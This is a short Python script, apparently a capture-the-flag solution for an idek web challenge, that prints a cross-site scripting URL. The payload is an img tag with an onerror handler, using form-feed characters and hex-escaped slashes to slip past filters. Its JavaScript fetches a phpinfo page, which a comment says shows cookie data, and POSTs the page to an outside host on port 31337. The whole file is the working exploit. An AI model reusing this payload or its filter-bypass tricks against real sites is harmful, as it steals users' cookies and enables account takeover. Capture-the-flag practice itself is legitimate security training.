import base64

from urllib.parse import quote_plus

url = "http://idek-hello.chal.idek.team:1337/"
# In html tags %0c can be used instead of space
# https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm
# phpinfo has cookie data on the page
script = """
fetch('info.php\\x2findex.php')
.then(x=>x.text())
.then(x=>{fetch('http:\\x2f\\x2f[REDACTED]:31337',{method:'POST',body:x})});
"""


to_replace = ["\r", "\n", "\t", " "]

for i in to_replace:
    script = script.replace(i, "")

assert '/' not in script
print(url + "?name=" + quote_plus("<img\x0csrc=\"asd\"\x0conerror=\"" + script + "\">"))
